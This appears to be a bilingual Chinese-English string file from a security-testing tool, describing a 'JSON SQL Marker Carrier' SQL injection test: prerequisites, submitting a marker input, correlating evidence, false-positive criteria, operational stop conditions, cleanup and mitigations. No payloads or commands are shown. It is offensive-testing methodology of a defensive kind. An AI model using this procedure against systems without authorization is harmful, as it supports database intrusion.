mitigation.zh: 使用参数化查询和严格类型 schema，在边缘统一 HTTP 分帧、内容类型和重复参数规则，拒绝歧义编码，并让 WAF 只承担纵深防御。
mitigation.en: Use parameterized queries and strict type schemas, normalize HTTP framing, content types, and duplicate-parameter rules at the edge, reject ambiguous encodings, and keep the WAF as defense in depth only.

title.zh: 限定JSON SQL Marker 载体前提
title.en: Constrain JSON SQL Marker Carrier prerequisites

description.zh: 确认JSON SQL Marker 载体对应的实现、版本、语句或传输上下文及隔离证据源均已记录。
description.en: Record the implementation, version, statement or transport context, and isolated evidence source required by JSON SQL Marker Carrier.

title.zh: 提交JSON SQL Marker 载体主输入
title.en: Submit the JSON SQL Marker Carrier primary input

description.zh: 仅提交 execution[0] 的审校输入，并为本次请求绑定唯一 marker、连接和审计标识。
description.en: Submit only the reviewed execution[0] input and bind a unique marker, connection, and audit identifier to the request.

title.zh: 关联JSON SQL Marker 载体证据
title.en: Correlate JSON SQL Marker Carrier evidence

description.zh: 关联同一 marker 的入口值、解析结果、最终 SQL、响应差分和服务端事件，排除回显、普通错误与其他分支。
description.en: Correlate the same marker across the entry value, parsed result, final SQL, response differential, and server event, excluding reflection, ordinary errors, and other branches.

title.zh: 关闭JSON SQL Marker 载体异常路径
title.en: Close the JSON SQL Marker Carrier abnormal path

description.zh: 恢复参数化、严格分帧和最小权限，删除测试 marker 与临时状态，再重放阴性及正常业务基线。
description.en: Restore parameterization, strict framing, and least privilege, remove test markers and temporary state, then replay negative and normal business baselines.

analysis.zh: JSON SQL Marker 载体的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for JSON SQL Marker Carrier requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.
